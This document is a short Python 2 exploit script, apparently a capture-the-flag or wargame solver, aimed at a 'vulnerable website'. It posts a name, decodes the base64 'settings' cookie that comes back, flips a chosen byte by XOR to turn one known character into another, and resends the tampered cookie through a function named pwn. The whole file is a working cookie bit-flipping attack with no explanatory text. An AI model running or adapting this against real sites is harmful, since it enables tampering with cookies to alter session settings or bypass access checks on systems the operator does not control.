#!/usr/bin/python
import requests
import sys
import urllib
from base64 import b64decode as dec
from base64 import b64encode as enc
import argparse
import re


parser = argparse.ArgumentParser()
parser.add_argument("URL", help="The vulnerable website")
parser.add_argument("NAME", help="The name to use")
parser.add_argument("-p", help="The position to manipulate", type=int, dest='pos')
parser.add_argument("-d", help="The destination value", type=ord, dest='dst')
parser.add_argument("-s", help="The source value", type=ord, dest='src')
 
def get_cookie(url, name):
    d = {
        'name':name,
        'submit':'Submit'
    }
    h = requests.post(url, data = d, headers = {'Content-Type' : 'application/x-www-form-urlencoded'}).headers
    if 'set-cookie' in h:
        h = dec(urllib.unquote_plus(h['set-cookie'][9:]))
        return h
    else:
        print '\033[31m[-] ERROR\033[0m'
        sys.exit(0)

def pwn(url, cookie):
    print requests.get(url, cookies={'settings': urllib.quote_plus(enc(cookie))}).text


def mixin(pos, source, target, cookie):
    newchar = chr(source ^ target ^ ord(cookie[pos]))
    return cookie[:pos] + newchar + cookie[pos+1:]


args = parser.parse_args()

 
print "[\033[34m*\033[0m] Publishing your name \033[33m%s\033[0m..." % args.NAME

if not re.match(r"^[a-zA-Z ']+$", args.NAME):
    print "    Your name looks strange, doesn't it? o_o" 

cookie = get_cookie(args.URL, args.NAME)
print "[\033[32m+\033[0m] Got a \033[36mCookie\033[0m :-)"

if args.pos is not None and args.dst is not None and args.src is not None:
    print "[\033[34m*\033[0m] Mixing some data @ %d to get %c from %c    8-)" % (args.pos, args.dst, args.src)
    exploit = mixin(args.pos, args.src, args.dst, cookie)
else:
    exploit = cookie


print "[\033[34m*\033[0m] Resending to server..."
pwn(args.URL, exploit)
